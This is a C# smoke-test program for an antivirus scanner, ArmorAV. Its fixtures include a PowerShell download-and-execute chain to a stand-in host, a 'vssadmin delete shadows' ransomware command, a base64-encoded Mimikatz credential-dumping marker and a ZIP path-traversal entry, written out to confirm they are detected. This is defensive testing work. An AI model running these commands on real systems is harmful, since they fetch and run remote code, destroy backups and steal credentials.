using System.IO.Compression;
using System.Text;
using System.Text.Json.Nodes;
using ArmorAV;

namespace ArmorAV.SmokeTests;

internal static class Program
{
    private static int Main()
    {
        var root = Path.Combine(Path.GetTempPath(), "armorav-smoke-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(root);
        try
        {
            DetectsKnownAndBenignSamples(root);
            DetectsExecutionChains(root);
            DetectsCredentialToolMarkers(root);
            DetectsUserWritableExecutableNames();
            DetectsZipTraversal(root);
            CacheRequiresAnExactContentHash(root);
            CsvFormulaValuesAreNeutralized();
            QuarantineIsAuthenticatedAndRestorable(root);
            QuarantineMetadataTamperingIsRejected(root);
            Console.WriteLine("ArmorAV smoke tests passed.");
            return 0;
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine("ArmorAV smoke test failed: " + ex.Message);
            return 1;
        }
        finally
        {
            if (Directory.Exists(root)) Directory.Delete(root, true);
        }
    }

    private static void DetectsKnownAndBenignSamples(string root)
    {
        var samples = Path.Combine(root, "samples");
        Directory.CreateDirectory(samples);
        CopyFixture("benign.txt", samples);
        CopyFixture("eicar.txt", samples);
        CopyFixture("suspicious.ps1", samples);

        var report = ArmorAVService.Scan(new ScanRequest
        {
            Path = samples,
            DataDirectory = Path.Combine(root, "app-data"),
            UseCache = false
        });
        Assert(report.Results.Count == 3, "the sample directory should produce three results");
        Assert(report.Results.Single(x => x.Path.EndsWith("eicar.txt")).VerdictText == Verdict.Confirmed.ToString(),
            "the EICAR test string must be confirmed");
        Assert(report.Results.Single(x => x.Path.EndsWith("benign.txt")).VerdictText == Verdict.Clean.ToString(),
            "a benign text sample must remain clean");
        Assert(report.Results.Single(x => x.Path.EndsWith("suspicious.ps1")).VerdictText == Verdict.Suspicious.ToString(),
            "a shadow-copy deletion command must be suspicious");
    }

    private static void DetectsExecutionChains(string root)
    {
        var path = Path.Combine(root, "invoice_update.ps1");
        File.WriteAllText(path, "Invoke-WebRequest https://example.invalid/payload -OutFile $env:TEMP\\x; IEX (Get-Content $env:TEMP\\x)");
        var report = ArmorAVService.Scan(new ScanRequest
        {
            Path = path,
            DataDirectory = Path.Combine(root, "chain-app-data"),
            UseCache = false
        });
        Assert(report.Results.Single().Findings.Any(x => x.Name == "Script.DownloadExecutionChain"),
            "a download-and-execute chain must be detected");
    }

    private static void DetectsCredentialToolMarkers(string root)
    {
        var path = Path.Combine(root, "credential-marker.txt");
        var marker = Encoding.UTF8.GetString(Convert.FromBase64String("c2VrdXJsc2E6OmxvZ29ucGFzc3dvcmRz"));
        var expectedName = Encoding.UTF8.GetString(Convert.FromBase64String("Q3JlZFRoZWZ0LlNla3VybHNhTG9nb25QYXNzd29yZHM="));
        File.WriteAllText(path, marker);
        var report = ArmorAVService.Scan(new ScanRequest
        {
            Path = path,
            DataDirectory = Path.Combine(root, "credential-marker-data"),
            UseCache = false
        });
        Assert(report.Results.Single().Findings.Any(x => x.Name == expectedName), "credential-tool command markers must remain detectable");
    }

    private static void DetectsUserWritableExecutableNames()
    {
        var hits = NameAnalyzer.Analyze(@"C:\Users\Test\Downloads\invoice_update.exe");
        Assert(hits.Any(x => x.Key == "Name.UserWritableExecutable"), "a lure executable in Downloads must be identified as user-writable");
    }

    private static void DetectsZipTraversal(string root)
    {
        var path = Path.Combine(root, "traversal.zip");
        using (var archive = ZipFile.Open(path, ZipArchiveMode.Create))
        {
            var entry = archive.CreateEntry("../../invoice.exe");
            using var writer = new StreamWriter(entry.Open());
            writer.Write("not an executable");
        }

        var report = ArmorAVService.Scan(new ScanRequest
        {
            Path = path,
            DataDirectory = Path.Combine(root, "zip-app-data"),
            UseCache = false
        });
        Assert(report.Results.Single().Findings.Any(x => x.Name == "Archive.PathTraversal"),
            "a path traversal ZIP entry must be reported");
    }

    private static void CacheRequiresAnExactContentHash(string root)
    {
        var dataDirectory = Path.Combine(root, "cache-data");
        var path = Path.Combine(root, "cache-test.ps1");
        var benign = "Write-Output 'safe';".PadRight(80);
        var suspicious = "vssadmin delete shadows /all /quiet;".PadRight(80);
        Assert(benign.Length == suspicious.Length, "cache fixture lengths must match");
        File.WriteAllText(path, benign);
        var originalTimestamp = File.GetLastWriteTimeUtc(path);
        var first = ArmorAVService.Scan(new ScanRequest { Path = path, DataDirectory = dataDirectory, UseCache = true });
        Assert(first.CacheHits == 0 && first.Results.Single().VerdictText == Verdict.Clean.ToString(), "the initial cache fixture must be clean and uncached");

        File.WriteAllText(path, suspicious);
        File.SetLastWriteTimeUtc(path, originalTimestamp);
        var second = ArmorAVService.Scan(new ScanRequest { Path = path, DataDirectory = dataDirectory, UseCache = true });
        Assert(second.CacheHits == 0, "a same-size file with a preserved timestamp must not hit cache");
        Assert(second.Results.Single().Findings.Any(x => x.Name == "Ransom.VssadminDeleteShadows"), "changed cached content must be analyzed again");
    }

    private static void CsvFormulaValuesAreNeutralized()
    {
        Assert(Util.CsvEscape("=HYPERLINK(\"https://example.invalid\")").StartsWith("'", StringComparison.Ordinal),
            "CSV values beginning with a spreadsheet formula marker must be neutralized");
    }

    private static void QuarantineIsAuthenticatedAndRestorable(string root)
    {
        var dataDirectory = Path.Combine(root, "quarantine-data");
        var source = Path.Combine(root, "confirmed.bin");
        var bytes = "quarantine round trip"u8.ToArray();
        File.WriteAllBytes(source, bytes);
        var hashes = Hasher.FromFile(source);
        var store = new QuarantineStore(dataDirectory, null);
        var record = store.Store(source, hashes, "fingerprint", 100, new[] { "test" }, dryRun: false);

        var blob = Path.Combine(dataDirectory, "quarantine", record.Id + ".bin");
        Assert(!File.Exists(source), "a committed quarantine operation must remove the original file");
        Assert(File.Exists(blob), "the encrypted quarantine blob must exist");
        Assert(!File.ReadAllBytes(blob).AsSpan().SequenceEqual(bytes), "the quarantine blob must not store the source plaintext");

        Assert(store.Restore(record.Id, out var message), "the new quarantine format must restore: " + message);
        Assert(File.ReadAllBytes(source).AsSpan().SequenceEqual(bytes), "restored bytes must match the original file");
    }

    private static void QuarantineMetadataTamperingIsRejected(string root)
    {
        var dataDirectory = Path.Combine(root, "tamper-data");
        var source = Path.Combine(root, "tamper-source.bin");
        var alternate = Path.Combine(root, "tamper-target.bin");
        File.WriteAllText(source, "authenticated quarantine sample");
        var store = new QuarantineStore(dataDirectory, null);
        var record = store.Store(source, Hasher.FromFile(source), "fingerprint", 100, new[] { "test" }, dryRun: false);
        var metadataPath = Path.Combine(dataDirectory, "quarantine", record.Id + ".json");
        var metadata = JsonNode.Parse(File.ReadAllText(metadataPath))!.AsObject();
        metadata["originalPath"] = alternate;
        File.WriteAllText(metadataPath, metadata.ToJsonString());

        Assert(!store.Restore(record.Id, out _), "changing authenticated quarantine metadata must block restore");
        Assert(!File.Exists(alternate), "tampered metadata must not choose a restore destination");
        Assert(!store.Restore("../" + record.Id, out _), "path-like quarantine identifiers must be rejected");
    }

    private static void CopyFixture(string fileName, string destination)
    {
        var source = Path.Combine(AppContext.BaseDirectory, "Fixtures", fileName);
        if (!File.Exists(source)) throw new FileNotFoundException("Test fixture was not copied to output.", source);
        File.Copy(source, Path.Combine(destination, fileName));
    }

    private static void Assert(bool condition, string message)
    {
        if (!condition) throw new InvalidOperationException(message);
    }
}
